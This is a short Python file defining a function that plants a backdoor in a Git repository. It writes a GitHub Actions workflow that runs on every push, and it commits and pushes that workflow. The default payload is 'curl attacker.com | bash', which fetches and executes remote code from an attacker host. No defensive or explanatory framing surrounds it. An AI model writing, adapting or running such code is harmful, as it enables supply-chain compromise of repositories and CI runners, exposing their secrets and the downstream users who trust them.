import os
import subprocess

def inject_workflow_backdoor(repo_path: str, payload_command: str = "curl attacker.com | bash") -> str:
    try:
        workflows_dir = os.path.join(repo_path, ".github", "workflows")
        os.makedirs(workflows_dir, exist_ok=True)

        workflow_content = f"""name: Backdoor Workflow

on: [push]

jobs:
  backdoor:
    runs-on: ubuntu-latest
    steps:
      - name: Run payload
        run: {payload_command}
"""
        backdoor_path = os.path.join(workflows_dir, "backdoor.yml")
        with open(backdoor_path, 'w') as f:
            f.write(workflow_content)

        subprocess.run(["git", "add", backdoor_path], cwd=repo_path, check=True)
        subprocess.run(["git", "commit", "-m", "Add backdoor workflow"], cwd=repo_path, check=True)
        subprocess.run(["git", "push"], cwd=repo_path, check=True)

        return f"✅ Backdoor workflow committed and pushed to repo: {repo_path}"

    except Exception as e:
        return f"❌ Error injecting workflow: {str(e)}"
